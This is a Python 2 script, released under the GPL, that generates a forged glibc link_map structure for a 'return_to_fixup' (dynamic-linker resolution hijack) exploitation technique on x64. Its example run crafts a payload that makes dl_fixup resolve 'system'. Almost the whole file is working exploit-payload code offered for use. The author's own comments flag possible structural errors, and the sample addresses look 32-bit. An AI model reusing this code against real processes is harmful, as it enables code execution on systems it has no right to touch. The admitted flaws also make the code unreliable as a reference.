"""
link_map generator for return_to_fixup technique (x64 version)
Copyright (C) 2016-2017 WindAvid
Join us now, share software,
You'll be a free hacker!

This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
"""
import struct


_Elf64_Dyn = '<QQ'

def Elf64_Dyn(d_tag, d_ptr):
    """
    d_ptr is important
    """
    return struct.pack(_Elf64_Dyn, d_tag, d_ptr)


_Elf64_Sym = '<IIQQ'

def Elf64_Sym(st_name, st_value, st_size, rest):
    """
    st_name is offset in strtab section
    """
    return struct.pack(_Elf64_Sym, st_name, rest, st_value, st_size)


_Elf64_Rel = '<QQ'  # TODO: possible errors, actual structure has 3 fields

def Elf64_Rel(r_offset, r_info):
    return struct.pack(_Elf64_Dyn, r_offset, r_info)


def mutate(dst, src, offset):
    """
    accepts mutable iterable dst (bytearray | list) and substitutes
    src from offset
    """
    assert len(dst) >= len(src) + offset
    dst[offset:offset+len(src)] = src


DT_STRTAB = 0x5
DT_SYMTAB = 0x6
DT_JMPREL = 0x17
# versum index is 0x31

def create_link_map64(new_addr, old_addr, write_addr, strtab, srindex):
    """
    crete link_map structure for dl_fixup function, such as:
        &link_map = new_addr
        link_map.getName(reloc_arg) = str
    stores pointer structures and strings inside link_map (in unused space)
    to reduce used space, see the diagramm in description

    parameters from running process:
        new_addr - address, where link_map will be stored in target process
        old_addr - address of original link_map (for lm.l_scope_mem)

    choosed by us:
        write_addr - where dl_fixup will store found function's address
        reloc_arg -  reloc_arg, corresponging to the name
    """
    strname, reloc_arg = srindex
    #reloc_arg = 2

    l_addr = 0
    native_word = 8 #4
    scope_mem_off = 0x358  # 0x1b8

    # size_total = 0x250 total size of link_map in c programm
    # we don't need to fill it all, as not all fields will be used

    # this indicies in bytearray are offsets of used fields in link_map
    #reserved = [0, 0x34, 0x38, 0x7c, 0xe4, 0x1cc]
    # errwas: 0x40 instead of 0x68
    reserved = [0, 0x68, 0x70, 0xf8, 0x1c8, 0x380]
    # indicies / 4: [0, 13, 14, 31, 57, 115] (as int[] indicies)
    off_addr, off_if_str, off_if_sym, off_if_rel, off_if_ver, off_scope = reserved
    # off_addr = offset of link_map.l_addr
    # off_if_str = offset of link_map.l_info[DT_STRTAB], if for InFo
    # off_scope = offset of link_map.l_scope
    size_eff = max(reserved) + native_word

    blank = 0 # blank space filler symbol
    link_map = bytearray([blank] * size_eff)

    # write link_map fields
    mutate(link_map, struct.pack('<Q', l_addr), off_addr)
    mutate(link_map, struct.pack('<Q', 0), off_if_ver) # set version to NULL
    sval_scope = struct.pack('<Q', old_addr + scope_mem_off)
    mutate(link_map, sval_scope, off_scope)

    # pl_ for place - index in bytearray, where to put something
    # place from pl_str in a row: dat_str, dat_sym, dat_rel
    # between off_if_ver and off_scope offsets
    pl_str = 0x200
    dat_str = strtab  # 'ssystem\x00'

    up_8 = lambda x: x + ((8 - x % 8) if x % 8 else 0)
    print 'up_8: ', up_8(len(dat_str))
    pl_sym = pl_str + up_8(len(dat_str))
    dat_sym = Elf64_Sym(strname, 0, 0, 0)

    pl_rel = pl_sym + len(dat_sym)
    r_index = 0  # index in sym table
    r_type = 0x7 # assertion bypass in dl_fixup

    #_rel_r_info = (r_index << 8) + r_type
    _rel_r_info = (r_index << 32) + r_type

    _rel_r_offset = write_addr
    dat_rel = Elf64_Rel(_rel_r_offset, _rel_r_info)

    assert pl_rel + len(dat_rel) <= off_scope, 'Mutation error: no free space'

    mutate(link_map, dat_str, pl_str)
    mutate(link_map, dat_sym, pl_sym)
    mutate(link_map, dat_rel, pl_rel)

    # dynamic entries, ptr's are adjusted with l_addr
    # place dynamic entries Elf64_Dyn between off_addr and off_if_str
    pl_dyn_str = off_addr + native_word
    _dyn_str_d_ptr = new_addr + pl_str - l_addr
    # act, DT_STRTAB not necessary here
    dat_dyn_str = Elf64_Dyn(DT_STRTAB, _dyn_str_d_ptr)

    # these in real must be array entries
    pl_dyn_sym = pl_dyn_str + len(dat_dyn_str)
    _dyn_sym_ptr = new_addr + pl_sym - l_addr
    dat_dyn_sym = Elf64_Dyn(DT_SYMTAB, _dyn_sym_ptr)

    pl_dyn_rel = pl_dyn_sym + len(dat_dyn_sym)
    # begin of reloc table pointer
    _dyn_rel_ptr = new_addr + pl_rel - l_addr - reloc_arg * 24
    dat_dyn_rel = Elf64_Dyn(DT_JMPREL, _dyn_rel_ptr)

    assert pl_dyn_rel + len(dat_dyn_rel) <= off_if_str,\
        'Mutation error: no free space'

    print '*' * 10 + 'here'

    # write dyns on their places
    # errwas: I instead of Q
    mutate(link_map, dat_dyn_str, pl_dyn_str)
    addr_dyn_str = struct.pack('<Q', new_addr + pl_dyn_str)
    mutate(link_map, addr_dyn_str, off_if_str)

    mutate(link_map, dat_dyn_sym, pl_dyn_sym)
    addr_dyn_sym = struct.pack('<Q', new_addr + pl_dyn_sym)
    mutate(link_map, addr_dyn_sym, off_if_sym)

    mutate(link_map, dat_dyn_rel, pl_dyn_rel)
    addr_dyn_rel = struct.pack('<Q', new_addr + pl_dyn_rel)
    mutate(link_map, addr_dyn_rel, off_if_rel)

    return str(link_map)


if __name__ == "__main__":
    # example of usage:
    new_addr = 0x804b0a0
    old_addr = 0xf775a938
    write_addr = 0x804b010
    reloc_arg = 0x28
    strtab = 'ssystem\x00' # we pass this string as a strtab
    srindex = (1, reloc_arg) # index in strtab, reloc_arg

    payload = create_link_map64(new_addr, old_addr, write_addr, strtab, srindex)
    print 'length:', len(payload)
